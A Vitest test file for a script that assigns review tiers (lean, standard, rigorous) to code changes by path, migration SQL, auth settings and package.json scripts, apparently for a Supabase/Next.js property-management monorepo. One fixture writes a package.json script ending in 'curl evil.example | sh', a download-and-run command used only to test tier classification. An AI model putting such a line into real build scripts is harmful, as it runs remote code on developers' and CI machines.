import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { addedLines, classify, isBelow, RULES, type Change, type Tier } from './verify-tier.ts';

const change = (path: string, added = ''): Change => ({ path, before: '', after: added });

const BASE_MANIFEST = { name: 'esta', packageManager: 'pnpm@10.0.0', scripts: { check: 'pnpm lint', lint: 'eslint .' }, dependencies: { zod: '^4.6.5' } };
const manifest = (before: object, after: object, path = 'package.json'): Change => ({
  path,
  before: JSON.stringify(before, null, 2),
  after: JSON.stringify(after, null, 2),
});
const withScripts = (scripts: Record<string, string>) => ({ ...BASE_MANIFEST, scripts: { ...BASE_MANIFEST.scripts, ...scripts } });

const CONFIG_BEFORE = '[api]\nport = 54321\n\n[auth]\nenable_signup = false\n\n[auth.email]\nenable_confirmations = true\n';
const config = (after: string): Change => ({ path: 'supabase/config.toml', before: CONFIG_BEFORE, after });

const MIGRATION = 'supabase/migrations/20261007301000_x.sql';

const CASES: readonly { readonly change: Change; readonly tier: Tier }[] = [
  ...[
    'packages/core/src/money/vnd.ts',
    'packages/core/src/allocation/allocate.ts',
    'packages/core/src/tax/position.ts',
    'packages/core/src/vietqr/encode.ts',
    'packages/core/src/schedule/generate.ts',
    'packages/core/src/matching/match.ts',
    'packages/core/src/format/index.ts',
    'packages/core/src/parse/vnd-input.ts',
    'apps/web/src/app/api/cron/keep-alive/route.ts',
    'apps/web/src/server/cron/auth.ts',
    'apps/agent/src/runner.ts',
    'apps/web/src/app/sign-in/actions.ts',
    'apps/web/src/server/member.ts',
    'apps/web/src/server/supabase/session.ts',
    'apps/web/src/proxy.ts',
    'packages/core/src/auth/otp.ts',
    'apps/web/src/server/invite.ts',
    'apps/web/src/app/(app)/settings/roles/page.tsx',
    'packages/core/src/ledger/post.ts',
    'packages/core/src/invoice/make.ts',
    'packages/core/src/proposals/execute.ts',
    'packages/core/src/schemas/payment.ts',
    'packages/core/src/clock/index.ts',
    'packages/core/src/money.ts',
    'packages/core/src/index.ts',
    'packages/core/tsconfig.json',
    'apps/agent/src/prompts/system.md',
    'apps/agent/README.md',
    'apps/agent/src/tools/household-info.ts',
    'eslint-rules/service-role-allowlist.mjs',
    'eslint-rules/no-browser-supabase-client.mjs',
    'eslint-rules/no-guard-disable.mjs',
    'apps/web/src/app/onboarding/actions.ts',
    'apps/web/src/app/onboarding/page.tsx',
    'supabase/migrations/20261007301000_x.sql',
    'supabase/migrations/20261007301000_notes.md',
    'supabase/migrations/old/readme.txt',
  ].map((path) => ({ change: change(path), tier: 'rigorous' as const })),
  { change: change('apps/web/src/app/(app)/settings/members/actions.ts', "await supabase.rpc('claim_invite', { code });"), tier: 'rigorous' },
  { change: change('apps/web/src/app/(app)/team/actions.ts', "await supabase.rpc('invite_member', { p_email: email });"), tier: 'rigorous' },
  { change: change('apps/web/src/app/(app)/team/actions.ts', "await supabase.rpc('create_household', { p_name: name });"), tier: 'rigorous' },
  { change: change('apps/web/src/app/(app)/team/actions.ts', "await supabase.from('household_members').update({ role }).eq('id', id);"), tier: 'rigorous' },
  { change: change('apps/web/src/app/(app)/page.tsx', 'const role: member_role = member.role;'), tier: 'rigorous' },
  { change: change('packages/db/src/database.types.ts', "member_role: 'admin' | 'owner';"), tier: 'rigorous' },
  { change: change(MIGRATION, 'grant select on public.invoices to authenticated;'), tier: 'rigorous' },
  { change: change(MIGRATION, 'alter table public.leases add column note text;'), tier: 'rigorous' },
  { change: config('[api]\nport = 54321\n\n[auth]\nenable_signup = true\n\n[auth.email]\nenable_confirmations = true\n'), tier: 'rigorous' },
  { change: config('[api]\nport = 54321\n\n[auth]\nenable_signup = false\n'), tier: 'rigorous' },
  { change: config(`${CONFIG_BEFORE}\n[auth.external.google]\nenabled = true\n`), tier: 'rigorous' },
  { change: { path: 'supabase/config.toml' }, tier: 'rigorous' },
  { change: manifest(BASE_MANIFEST, withScripts({ postinstall: 'node scripts/x.ts' })), tier: 'rigorous' },
  { change: manifest(BASE_MANIFEST, withScripts({ prepare: 'node scripts/x.ts' })), tier: 'rigorous' },
  { change: manifest(BASE_MANIFEST, withScripts({ precheck: 'node scripts/x.ts' })), tier: 'rigorous' },
  { change: manifest(BASE_MANIFEST, withScripts({ lint: 'eslint . && node scripts/x.ts' })), tier: 'standard' },
  { change: manifest(BASE_MANIFEST, { ...withScripts({ postinstall: 'node scripts/x.ts' }), dependencies: {} }, 'apps/web/package.json'), tier: 'rigorous' },
  { change: config('[api]\nport = 54322\n\n[auth]\nenable_signup = false\n\n[auth.email]\nenable_confirmations = true\n'), tier: 'standard' },
  { change: change('apps/web/src/app/(app)/properties/page.tsx'), tier: 'standard' },
  { change: change('apps/web/src/components/button.tsx'), tier: 'standard' },
  { change: manifest(BASE_MANIFEST, withScripts({ 'verify:tier': 'node scripts/verify-tier.ts' })), tier: 'lean' },
  { change: manifest(BASE_MANIFEST, withScripts({ preview: 'next start', 'db:seed': 'node scripts/seed.ts' }), 'apps/web/package.json'), tier: 'lean' },
  { change: manifest(BASE_MANIFEST, { ...BASE_MANIFEST, dependencies: { ...BASE_MANIFEST.dependencies, 'left-pad': '^1.0.0' } }), tier: 'standard' },
  { change: manifest(BASE_MANIFEST, { ...withScripts({ extra: 'pnpm lint' }), packageManager: 'pnpm@99.0.0' }), tier: 'standard' },
  { change: manifest(BASE_MANIFEST, withScripts({ check: 'pnpm lint && pnpm test' })), tier: 'standard' },
  { change: manifest(BASE_MANIFEST, { ...BASE_MANIFEST, scripts: { check: 'pnpm lint' } }), tier: 'standard' },
  { change: manifest(BASE_MANIFEST, { ...withScripts({ extra: 'pnpm lint' }), dependencies: {} }), tier: 'standard' },
  { change: manifest(BASE_MANIFEST, BASE_MANIFEST), tier: 'standard' },
  { change: { path: 'package.json', before: '', after: JSON.stringify(BASE_MANIFEST) }, tier: 'standard' },
  { change: { path: 'package.json', before: JSON.stringify(BASE_MANIFEST), after: '{ not json' }, tier: 'standard' },
  { change: { path: 'package.json' }, tier: 'standard' },
  { change: change('package.json'), tier: 'standard' },
  ...[
    'playwright.config.ts',
    'pnpm-lock.yaml',
    '.env.example',
    '.github/workflows/deploy.yml',
    'supabase/seed/seed.ts',
    'supabase/seed/README.md',
    'apps/web/next.config.ts',
    'apps/web/src/middleware.ts',
    'eslint.config.mjs',
    'eslint-rules/no-jsx-literals.mjs',
    'eslint-rules/lint-text.ts',
    'scripts/backup.ts',
    'scripts/db.ts',
  ].map((path) => ({ change: change(path), tier: 'standard' as const })),
  ...[
    'docs/plan/STATUS.md',
    'CLAUDE.md',
    'packages/core/src/tax/README.md',
    'apps/web/src/server/cron/README.md',
    'tools/ci-local.sh',
    'e2e/shell.spec.ts',
    'e2e/support/seed.ts',
    'packages/core/src/tax/position.test.ts',
    'packages/core/src/allocation/allocate.bench.ts',
    'apps/agent/src/runner.test.ts',
    'apps/agent/src/test/fake-db.ts',
    'apps/web/src/test/render.tsx',
    'apps/web/src/server/cron/invoices.test.ts',
    'eslint-rules/service-role-allowlist.test.ts',
    'scripts/verify-tier.test.ts',
    'supabase/tests/properties.test.sql',
    'supabase/seed/generator/lint.test.ts',
    'fixtures/agent-replay/ping/abc.json',
  ].map((path) => ({ change: change(path), tier: 'lean' as const })),
];

const MIGRATION_TEXTS = [
  'grant select on public.invoices to authenticated;',
  'REVOKE ALL ON public.invoices FROM anon;',
  'create policy invoices_read on public.invoices for select using (true);',
  'create function private.claim() returns void language sql security definer as $$ select 1 $$;',
  'delete from public.invoices where paid;',
  'drop table public.invoices;',
  "insert into storage.buckets (id, name) values ('documents', 'documents');",
  "select private.enable_household_rls('invoices', 'admin');",
  'update public.leases l set rent = rent * 2;',
  'insert into public.units (id) select id from public.properties;',
  'create view public.v as select * from private.secret;',
  "alter type public.member_role add value 'owner';",
  'merge into public.t using s on true when matched then update set x = 1;',
  'with a as (select 1) update public.t set x = 1;',
  'alter table public.payments alter column amount type numeric using amount::numeric;',
  'create table public.foo (id uuid primary key);',
  'alter table public.t add column x int;',
  'create index leases_unit_idx on public.leases (unit_id);',
  'create extension pg_net;',
  'create trigger t after insert on auth.users for each row execute function public.f();',
  'create function public.f() returns int language sql as $$ select 1 $$;',
  'insert into public.t values (1) on conflict (id)\n  do update set x = 1;',
  '',
];

describe('classify', () => {
  it.each(CASES.map((c) => [c.change.path, c.tier, c.change] as const))('puts %s at %s', (_path, tier, input) => {
    expect(classify([input]).tier).toBe(tier);
  });

  it('has a case for every registry entry', () => {
    const uncovered = RULES.filter((rule) => !CASES.some((c) => rule.match(c.change))).map((rule) => rule.reason);
    expect(uncovered).toEqual([]);
  });

  it.each(MIGRATION_TEXTS)('treats a migration with "%s" as rigorous', (sql) => {
    expect(classify([change(MIGRATION, sql)]).tier).toBe('rigorous');
  });

  it('treats a migration as rigorous when its text could not be read', () => {
    expect(classify([{ path: MIGRATION }]).tier).toBe('rigorous');
  });

  it('keeps a file the text cannot be read for at standard, never lean', () => {
    for (const path of ['apps/web/src/app/(app)/page.tsx', 'package.json', 'infra/caddy/Caddyfile.template', 'pnpm-workspace.yaml']) {
      expect(classify([{ path }]).tier).toBe('standard');
    }
  });

  it('sends a path no rule names to standard, never lean, and says why', () => {
    const result = classify([change('infra/caddy/Caddyfile.template')]);
    expect(result.tier).toBe('standard');
    expect(result.reasons).toHaveLength(1);
    expect(result.reasons[0]).toContain('infra/caddy/Caddyfile.template');
    expect(result.reasons[0]).toContain('no rule');
  });

  it('sends a path no rule names in the domain core or the assistant worker to rigorous', () => {
    for (const path of ['packages/core/src/ledger/post.ts', 'apps/agent/src/prompts/system.md', 'packages/core/vitest.config.ts']) {
      const result = classify([change(path)]);
      expect(result.tier).toBe('rigorous');
      expect(result.reasons[0]).toContain(path);
    }
  });

  it('lets the highest tier win whatever the order of the files', () => {
    const files = [change('docs/plan/STATUS.md'), change('apps/web/src/components/button.tsx'), change('packages/core/src/tax/position.ts')];
    expect(classify(files).tier).toBe('rigorous');
    expect(classify([...files].reverse()).tier).toBe('rigorous');
    expect(classify(files.slice(0, 2)).tier).toBe('standard');
  });

  it('explains only the files that set the tier', () => {
    const { reasons } = classify([change('docs/plan/STATUS.md'), change('packages/core/src/tax/position.ts')]);
    expect(reasons).toHaveLength(1);
    expect(reasons[0]).toContain('packages/core/src/tax/position.ts');
    expect(reasons[0]).not.toContain('STATUS.md');
  });

  it('writes one line per reason and groups the files that share it', () => {
    const { reasons } = classify([
      change('packages/core/src/tax/position.ts'),
      change('packages/core/src/tax/rules.ts'),
      change('apps/agent/src/runner.ts'),
    ]);
    expect(reasons).toHaveLength(2);
    expect(reasons.find((line) => line.includes('tax/position.ts'))).toContain('tax/rules.ts');
  });

  it('names three files and counts the rest', () => {
    const files = ['a', 'b', 'c', 'd', 'e'].map((name) => change(`packages/core/src/tax/${name}.ts`));
    const [line] = classify(files).reasons;
    expect(line).toContain('tax/a.ts');
    expect(line).toContain('tax/c.ts');
    expect(line).not.toContain('tax/d.ts');
    expect(line).toContain('2 more');
  });

  it('calls an empty change lean', () => {
    expect(classify([])).toEqual({ tier: 'lean', reasons: ['No files changed.'] });
  });
});

describe('isBelow', () => {
  it('is true only when the declared tier ranks under the computed one', () => {
    expect(isBelow('lean', 'rigorous')).toBe(true);
    expect(isBelow('standard', 'rigorous')).toBe(true);
    expect(isBelow('lean', 'standard')).toBe(true);
    expect(isBelow('rigorous', 'rigorous')).toBe(false);
    expect(isBelow('rigorous', 'lean')).toBe(false);
  });
});

describe('addedLines', () => {
  it('returns the lines the change adds and nothing else', () => {
    expect(addedLines({ path: 'a', before: 'one\ntwo\n', after: 'one\nthree\ntwo\n' })).toEqual(['three']);
  });

  it('counts a line that appears more often after than before', () => {
    expect(addedLines({ path: 'a', before: 'x\ny', after: 'x\nx\ny' })).toEqual(['x']);
  });

  it('returns every line of a new file', () => {
    expect(addedLines({ path: 'a', before: '', after: 'x\ny' })).toEqual(expect.arrayContaining(['x', 'y']));
  });

  it('is undefined when either side could not be read', () => {
    expect(addedLines({ path: 'a', before: 'x' })).toBeUndefined();
    expect(addedLines({ path: 'a', after: 'x' })).toBeUndefined();
  });
});

describe('verify:tier command', () => {
  const script = join(import.meta.dirname, 'verify-tier.ts');
  let repo = '';

  const git = (...args: string[]) => {
    const result = spawnSync('git', ['-c', 'user.name=Test', '-c', 'user.email=test@example.com', '-c', 'commit.gpgsign=false', ...args], { cwd: repo, encoding: 'utf8' });
    if (result.status !== 0) throw new Error(`git ${args.join(' ')}: ${result.stderr}`);
    return result.stdout;
  };

  const write = (path: string, text: string | Buffer) => {
    mkdirSync(dirname(join(repo, path)), { recursive: true });
    writeFileSync(join(repo, path), text);
  };

  const commit = (message: string) => {
    git('add', '-A');
    git('commit', '-m', message);
  };

  const run = (...args: string[]) => spawnSync(process.execPath, [script, ...args], { cwd: repo, encoding: 'utf8' });

  beforeAll(() => {
    repo = mkdtempSync(join(tmpdir(), 'verify-tier-'));
    git('init', '-b', 'main');
    write('docs/notes.md', 'one\n');
    write('scripts/draft.sql', 'grant select on public.invoices to authenticated;\n');
    write('packages/core/src/tax/position.ts', 'export const a = 1;\n');
    write('apps/web/src/components/card.tsx', 'export const card = 1;\n');
    write('package.json', `${JSON.stringify({ name: 'esta', scripts: { check: 'pnpm lint' }, dependencies: { zod: '^4' } }, null, 2)}\n`);
    write('supabase/config.toml', '[api]\nport = 54321\n\n[auth]\nenable_signup = false\n');
    write('.gitattributes', '*.nodiff.ts -diff\n');
    commit('base');
    git('checkout', '-b', 'docs-only');
    write('docs/notes.md', 'one\ntwo\n');
    commit('docs');
    git('checkout', '-b', 'taxes', 'main');
    write('packages/core/src/tax/position.ts', 'export const a = 2;\n');
    write('docs/notes.md', 'one\nthree\n');
    commit('tax');
    git('checkout', '-b', 'policy', 'main');
    write('supabase/migrations/20261007301000_x.sql', 'grant select on public.invoices to authenticated;\n');
    commit('policy');
    git('checkout', '-b', 'moved', 'main');
    mkdirSync(join(repo, 'supabase/migrations'), { recursive: true });
    git('mv', 'scripts/draft.sql', 'supabase/migrations/20261007301000_x.sql');
    commit('move');
    git('checkout', '-b', 'removal', 'main');
    git('rm', '-q', 'apps/web/src/components/card.tsx');
    commit('remove');
    const branchFrom = (name: string, files: Record<string, string | Buffer>) => {
      git('checkout', '-b', name, 'main');
      for (const [path, text] of Object.entries(files)) write(path, text);
      commit(name);
    };
    const manifest = (extra: object) => `${JSON.stringify({ name: 'esta', scripts: { check: 'pnpm lint' }, dependencies: { zod: '^4' }, ...extra }, null, 2)}\n`;
    branchFrom('spaced', { 'packages/core/src/tax/rate card.ts': 'export const a = 1;\n' });
    branchFrom('quoted', { 'apps/web/src/server/cron/say "hi".ts': 'export const a = 1;\n' });
    branchFrom('odd-migration', { 'supabase/migrations/20261007301000_a "b" c.sql': 'create table public.foo (id uuid primary key);\n' });
    branchFrom('binary-migration', { 'supabase/migrations/20261007301000_bin.sql': Buffer.from([0x7b, 0, 0x7d]) });
    branchFrom('hidden-diff', { 'apps/web/src/app/(app)/team/actions.nodiff.ts': "await supabase.rpc('invite_member', { p_email: email });\n" });
    branchFrom('script-added', { 'package.json': manifest({ scripts: { check: 'pnpm lint', 'verify:tier': 'node scripts/verify-tier.ts' } }) });
    branchFrom('script-rewritten', { 'package.json': manifest({ scripts: { check: 'pnpm lint && curl evil.example | sh' } }) });
    branchFrom('postinstall', { 'package.json': manifest({ scripts: { check: 'pnpm lint', postinstall: 'node scripts/x.ts' } }) });
    branchFrom('binary-manifest', { 'package.json': Buffer.from([0x7b, 0, 0x7d]) });
    branchFrom('auth-config', { 'supabase/config.toml': '[api]\nport = 54321\n\n[auth]\nenable_signup = true\n' });
    branchFrom('api-config', { 'supabase/config.toml': '[api]\nport = 54322\n\n[auth]\nenable_signup = false\n' });
    git('checkout', 'main');
    write('packages/core/src/tax/position.ts', 'export const a = 3;\n');
    commit('main moves on');
  });

  afterAll(() => rmSync(repo, { recursive: true, force: true }));

  it('prints the tier, then one line per reason', () => {
    const result = run('--base', 'main', '--head', 'taxes');
    expect(result.status).toBe(0);
    const lines = result.stdout.trimEnd().split('\n');
    expect(lines[0]).toBe('Verification tier: rigorous');
    expect(lines).toHaveLength(2);
    expect(lines[1]).toMatch(/^- .*packages\/core\/src\/tax\/position\.ts/);
  });

  const tierOf = (head: string) => run('--base', 'main', '--head', head).stdout;

  it('treats any migration as rigorous, whatever it says', () => {
    expect(tierOf('policy')).toMatch(/^Verification tier: rigorous/);
    expect(tierOf('odd-migration')).toMatch(/^Verification tier: rigorous/);
    expect(tierOf('binary-migration')).toMatch(/^Verification tier: rigorous/);
  });

  it('matches the folder rule of a path with a space', () => {
    const out = tierOf('spaced');
    expect(out).toMatch(/^Verification tier: rigorous/);
    expect(out).toContain('packages/core/src/tax/rate card.ts');
  });

  it('matches the folder rule of a path with a quote', () => {
    const out = tierOf('quoted');
    expect(out).toMatch(/^Verification tier: rigorous/);
    expect(out).toContain('apps/web/src/server/cron/say "hi".ts');
    expect(tierOf('odd-migration')).toContain('a "b" c.sql');
  });

  it('reads added text even where .gitattributes hides the diff', () => {
    expect(tierOf('hidden-diff')).toMatch(/^Verification tier: rigorous/);
  });

  it('calls a package.json that only adds a script lean', () => {
    expect(tierOf('script-added')).toMatch(/^Verification tier: lean/);
  });

  it('calls a rewritten script standard and a new postinstall rigorous', () => {
    expect(tierOf('script-rewritten')).toMatch(/^Verification tier: standard/);
    expect(tierOf('postinstall')).toMatch(/^Verification tier: rigorous/);
  });

  it('never calls a package.json lean when its text cannot be read', () => {
    expect(tierOf('binary-manifest')).toMatch(/^Verification tier: standard/);
  });

  it('calls a changed auth setting rigorous and another setting standard', () => {
    expect(tierOf('auth-config')).toMatch(/^Verification tier: rigorous/);
    expect(tierOf('api-config')).toMatch(/^Verification tier: standard/);
  });

  it('reads the whole text of a file moved into the migrations folder', () => {
    expect(run('--base', 'main', '--head', 'moved').stdout).toMatch(/^Verification tier: rigorous/);
  });

  it('counts a deleted file by its name', () => {
    expect(run('--base', 'main', '--head', 'removal').stdout).toMatch(/^Verification tier: standard/);
  });

  it('measures from where the branch left the base, not from the base tip', () => {
    const result = run('--base', 'main', '--head', 'docs-only');
    expect(result.stdout).toMatch(/^Verification tier: lean/);
  });

  it('diffs HEAD when --head is left out', () => {
    git('checkout', '-q', 'docs-only');
    expect(run('--base', 'main').stdout).toMatch(/^Verification tier: lean/);
    git('checkout', '-q', 'main');
  });

  it('exits 1 when the declared tier is below the computed one', () => {
    const result = run('--base', 'main', '--head', 'taxes', '--declared', 'lean');
    expect(result.status).toBe(1);
    expect(result.stderr).toContain('lean');
    expect(result.stderr).toContain('rigorous');
    expect(result.stdout).toMatch(/^Verification tier: rigorous/);
  });

  it('accepts a declared tier at or above the computed one', () => {
    expect(run('--base', 'main', '--head', 'taxes', '--declared', 'rigorous').status).toBe(0);
    expect(run('--base', 'main', '--head', 'docs-only', '--declared', 'standard').status).toBe(0);
  });

  it('refuses a declared tier it does not know', () => {
    const result = run('--base', 'main', '--head', 'taxes', '--declared', 'urgent');
    expect(result.status).toBe(2);
    expect(result.stderr).toContain('lean, standard, rigorous');
  });

  it('fails loudly when the base ref does not exist', () => {
    const result = run('--base', 'no-such-ref');
    expect(result.status).toBe(2);
    expect(result.stderr).toContain('no-such-ref');
  });
});
